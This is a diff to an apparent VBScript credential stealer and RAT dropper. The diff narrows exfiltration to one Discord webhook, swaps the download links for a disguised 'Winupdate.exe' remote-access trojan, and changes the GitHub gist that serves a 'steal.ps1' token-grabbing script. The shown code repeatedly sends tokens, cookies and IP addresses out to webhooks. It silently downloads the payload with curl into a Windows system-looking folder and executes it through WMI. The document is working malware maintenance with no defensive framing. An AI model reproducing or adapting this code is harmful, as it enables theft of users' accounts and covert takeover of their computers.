@@ -32,22 +32,10 @@ Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
-    
-    ' Sends Re Grab to BOTH channels
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
-    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, WH)
-    
-    ' Sends tokens/cookies to BOTH channels
     Call GrabTokens(RE_WH)
-    Call GrabTokens(WH)
-    
-    ' Sends IP to BOTH channels
     Call IP(RE_WH)
-    Call IP(WH)
-    
-    ' Sends CookieOnly to BOTH channels
     Call PostCookieOnly(RE_WH)
-    Call PostCookieOnly(WH)
     
     ' Only download RAT if it hasn't dropped successfully yet
     If Not ratDropped Then
@@ -61,7 +49,8 @@ window.close()
 
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
+    ' Updated RAT Link
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1573211629770772510/Winupdate.exe?ex=6b012f01&is=6affdd81&hm=a224ef4e41dca378740f95f58a8a0cdd5406aa60f24b376a510f101adcf83d9b&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
@@ -71,9 +60,6 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' 1 COKET UI (Downloading & Launching)
-    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching RAT...", 10181046, targetWH)
-    
     ' Download via curl.exe
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
@@ -84,6 +70,8 @@ Sub DropRAT(targetWH, sendRocket)
         If fSize > 100000 Then
             Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
             
+            If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
+            
             ' Execute via WMI
             Call RunCmd("""" & op & """")
             
@@ -92,14 +80,11 @@ Sub DropRAT(targetWH, sendRocket)
             
             If sendRocket Then 
                 Call SleepSeconds(2)
-                ' Green Checkmark UI (Downloaded & Launched)
-                Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched RAT (" & fSizeMB & " MB)", 10181046, targetWH)
+                Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
             End If
-        Else
-            If sendRocket Then Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes", 16711680, targetWH)
         End If
     Else
-        If sendRocket Then Call PostEmbedTo(":x: RAT Download", "Download failed (link expired)", 16711680, targetWH)
+        If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Failed to fetch payload.", 10181046, targetWH)
     End If
 End Sub
 
@@ -232,7 +217,7 @@ End Sub
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/67fc73fcc4ec7c79990c7ba36f0fa50e22324d3a/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/127a7a0f6723e9b88492fe4c7e5e533e140b1d06/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
